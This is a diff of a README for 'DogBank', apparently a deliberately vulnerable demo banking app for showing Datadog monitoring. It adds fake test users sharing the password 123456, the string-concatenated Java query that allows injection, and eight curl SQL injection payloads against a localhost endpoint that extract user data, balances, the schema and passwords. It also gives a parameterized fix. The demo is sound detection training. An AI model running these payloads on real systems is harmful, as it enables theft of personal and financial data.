@@ -77,14 +77,20 @@ open http://localhost
 
 ---
 
-## 🔐 Test Credentials
+## 🔐 Test Users (All Users)
 
-| User | CPF | Password | Balance | PIX Key |
-|------|-----|----------|---------|---------|
-| Julia Medina | 12345678901 | 123456 | R$ 10,000.00 | julia.medina@dogbank.com |
-| Pedro Silva | 98765432101 | 123456 | R$ 15,000.00 | pedro.silva@dogbank.com |
-| Usuário Teste | 66666666666 | 123456 | R$ 50,000.00 | teste@dogbank.com |
-| João Santos | 11122233344 | 123456 | R$ 8,500.00 | joao.santos@dogbank.com |
+| # | Name | CPF | Password | Balance | Bank | PIX Key | Account |
+|---|------|-----|----------|---------|------|---------|---------|
+| 1 | Vitoria Itadori | 12345678915 | 123456 | R$ 10,000.00 | DOG BANK | vitoria.itadori@dogbank.com | 0001-9 |
+| 2 | Pedro Silva | 98765432101 | 123456 | R$ 15,000.00 | Banco do Brasil | pedro.silva@dogbank.com | 0002-1 |
+| 3 | João Santos | 45678912302 | 123456 | R$ 8,500.00 | Itaú | joao.santos@dogbank.com | 0003-2 |
+| 4 | Emiliano Costa | 78912345603 | 123456 | R$ 12,000.00 | Santander | emiliano.costa@dogbank.com | 0004-3 |
+| 5 | Eliane Oliveira | 32165498704 | 123456 | R$ 9,500.00 | Bradesco | eliane.oliveira@dogbank.com | 0005-4 |
+| 6 | Patrícia Souza | 65498732105 | 123456 | R$ 20,000.00 | Nubank | patricia.souza@dogbank.com | 0006-5 |
+| 7 | Renato Almeida | 15975385206 | 123456 | R$ 7,500.00 | DOG BANK | renato.almeida@dogbank.com | 0007-6 |
+| 8 | Usuário Teste | 66666666666 | 123456 | R$ 50,000.00 | DOG BANK | teste@dogbank.com | 0008-7 |
+
+> **Note**: All users have the same password: `123456`
 
 ---
 
@@ -108,7 +114,7 @@ open http://localhost
 
 ### 3. ❌ Expected Error: Insufficient Balance
 
-1. Login with CPF `11122233344` (João Santos - R$ 8,500)
+1. Login with CPF `15975385206` (Renato Almeida - R$ 7,500)
 2. Try to transfer R$ 10,000 to any valid PIX key
 3. ❌ **Error**: "Saldo insuficiente"
 
@@ -148,27 +154,161 @@ String sql = "SELECT u.nome, u.email, u.cpf, c.saldo, c.banco, u.chave_pix " +
              "WHERE u.chave_pix = '" + pixKey + "'";  // ⚠️ VULNERABLE!
 ```
 
-**Attack Examples**:
+### What Data Can Be Extracted?
 
+The vulnerable endpoint returns these fields from the database:
+- **nome** - User's full name
+- **email** - User's email address
+- **cpf** - User's CPF (Brazilian ID number)
+- **saldo** - Account balance 💰
+- **banco** - Bank name
+- **chave_pix** - PIX key
+
+---
+
+### 🔴 SQL Injection Attack Examples
+
+#### 1. Basic Injection - Bypass Authentication (Returns First User)
 ```bash
-# 1. Basic SQL Injection - Always True (returns first user)
 curl "http://localhost/api/transactions/validate-pix-key?pixKey=' OR '1'='1"
-
-# 2. UNION-based Injection - Extract all users
-curl "http://localhost/api/transactions/validate-pix-key?pixKey=' UNION SELECT nome, email, cpf, saldo::text, 'DogBank', chave_pix FROM usuarios u JOIN contas c ON u.id = c.usuario_id--"
-
-# 3. Extract table names from database
-curl "http://localhost/api/transactions/validate-pix-key?pixKey=' UNION SELECT table_name, null, null, null, null, null FROM information_schema.tables WHERE table_schema='public'--"
-
-# 4. Extract column names from usuarios table
-curl "http://localhost/api/transactions/validate-pix-key?pixKey=' UNION SELECT column_name, null, null, null, null, null FROM information_schema.columns WHERE table_name='usuarios'--"
 ```
 
-**What to observe in Datadog**:
-- APM traces showing the raw SQL query with injected payload
-- Security signals detecting SQL injection patterns
-- Error logs with SQL syntax errors from malformed injections
-- ASM (Application Security Monitoring) alerts
+**Expected Response:**
+```json
+{
+  "valid": true,
+  "nome": "Vitoria Itadori",
+  "email": "vitoria.itadori@dogbank.com",
+  "cpf": "***.***.***-15",
+  "saldo": "R$ 10000.00",
+  "banco": "DOG BANK",
+  "chave_pix": "vitoria.itadori@dogbank.com"
+}
+```
+
+---
+
+#### 2. Extract Account Balance of a Specific User 💰
+```bash
+# Get Pedro Silva's balance
+curl "http://localhost/api/transactions/validate-pix-key?pixKey=' OR email='pedro.silva@dogbank.com'--"
+```
+
+**Expected Response:**
+```json
+{
+  "valid": true,
+  "nome": "Pedro Silva",
+  "saldo": "R$ 15000.00",
+  "banco": "Banco do Brasil"
+}
+```
+
+---
+
+#### 3. Extract ALL Users and Their Balances (UNION Attack)
+```bash
+curl "http://localhost/api/transactions/validate-pix-key?pixKey=' UNION SELECT nome, email, cpf, saldo::text, banco, chave_pix FROM usuarios u JOIN contas c ON u.id = c.usuario_id LIMIT 1 OFFSET 0--"
+```
+
+Change `OFFSET 0` to `OFFSET 1`, `OFFSET 2`, etc. to iterate through all users.
+
+---
+
+#### 4. Extract User with Highest Balance
+```bash
+curl "http://localhost/api/transactions/validate-pix-key?pixKey=' UNION SELECT u.nome, u.email, u.cpf, c.saldo::text, c.banco, u.chave_pix FROM usuarios u JOIN contas c ON u.id = c.usuario_id ORDER BY c.saldo DESC LIMIT 1--"
+```
+
+**Expected Response:**
+```json
+{
+  "valid": true,
+  "nome": "Usuário Teste",
+  "saldo": "R$ 50000.00",
+  "banco": "DOG BANK"
+}
+```
+
+---
+
+#### 5. Extract Database Table Names
+```bash
+curl "http://localhost/api/transactions/validate-pix-key?pixKey=' UNION SELECT table_name, null, null, null, null, null FROM information_schema.tables WHERE table_schema='public'--"
+```
+
+**Expected Response (iterating):**
+- `usuarios`
+- `contas`
+- `transacoes_pix`
+
+---
+
+#### 6. Extract Column Names from `contas` Table
+```bash
+curl "http://localhost/api/transactions/validate-pix-key?pixKey=' UNION SELECT column_name, data_type, null, null, null, null FROM information_schema.columns WHERE table_name='contas'--"
+```
+
+**Columns in `contas` table:**
+- `id` - Account ID
+- `usuario_id` - User ID (foreign key)
+- `numero_conta` - Account number
+- `saldo` - Balance 💰
+- `banco` - Bank name
+- `user_name` - Account holder name
+- `criado_em` - Creation date
+
+---
+
+#### 7. Extract All Account Numbers and Balances
+```bash
+curl "http://localhost/api/transactions/validate-pix-key?pixKey=' UNION SELECT numero_conta, user_name, saldo::text, banco, null, null FROM contas LIMIT 1 OFFSET 0--"
+```
+
+---
+
+#### 8. Extract User Passwords (if stored in plain text)
+```bash
+curl "http://localhost/api/transactions/validate-pix-key?pixKey=' UNION SELECT nome, email, senha, cpf, null, null FROM usuarios LIMIT 1--"
+```
+
+---
+
+### 📊 Where to See the Attack in Datadog
+
+1. **APM Traces** (`https://app.datadoghq.com/apm/traces`)
+   - Search for `service:transaction-service`
+   - Look for traces with `resource_name:/api/transactions/validate-pix-key`
+   - Click on a trace to see the **SQL query with injected payload**
+
+2. **Logs** (`https://app.datadoghq.com/logs`)
+   - Filter: `service:transaction-service @message:*SQL*`
+   - You'll see logs like: `📝 [SQL QUERY]: SELECT ... WHERE u.chave_pix = '' OR '1'='1'`
+
+3. **Security Signals** (`https://app.datadoghq.com/security`)
+   - ASM will detect SQL injection patterns
+   - Look for alerts with `attack_type:sql_injection`
+
+4. **Error Tracking** (`https://app.datadoghq.com/apm/error-tracking`)
+   - Malformed SQL injections will cause errors
+   - You can see the full stack trace and query
+
+---
+
+### 🛡️ How to Fix (For Reference)
+
+The secure way to write this query:
+
+```java
+// ✅ SECURE - Using parameterized queries
+String sql = "SELECT u.nome, u.email, u.cpf, c.saldo, c.banco, u.chave_pix " +
+             "FROM usuarios u " +
+             "JOIN contas c ON u.id = c.usuario_id " +
+             "WHERE u.chave_pix = :pixKey";
+
+Query query = entityManager.createNativeQuery(sql);
+query.setParameter("pixKey", pixKey);  // Safe!
+```
 
 ---
 
@@ -339,17 +479,19 @@ docker-compose -f docker-compose.full.yml logs transaction-service 2>&1 | grep -
 # Connect to PostgreSQL
 docker exec -it dogbank-postgres psql -U dogbank -d dogbank
 
-# View users
-SELECT * FROM usuarios;
-
-# View accounts
-SELECT * FROM contas;
+# View all users with balances
+SELECT u.nome, u.cpf, u.chave_pix, c.saldo, c.banco 
+FROM usuarios u 
+JOIN contas c ON u.id = c.usuario_id 
+ORDER BY c.saldo DESC;
 
 # View transactions
-SELECT * FROM transacoes;
+SELECT * FROM transacoes_pix ORDER BY data_transacao DESC;
 
-# View PIX keys
-SELECT id, nome, cpf, chave_pix FROM usuarios;
+# Check specific user balance
+SELECT u.nome, c.saldo FROM usuarios u 
+JOIN contas c ON u.id = c.usuario_id 
+WHERE u.chave_pix = 'teste@dogbank.com';
 ```
 
 ---
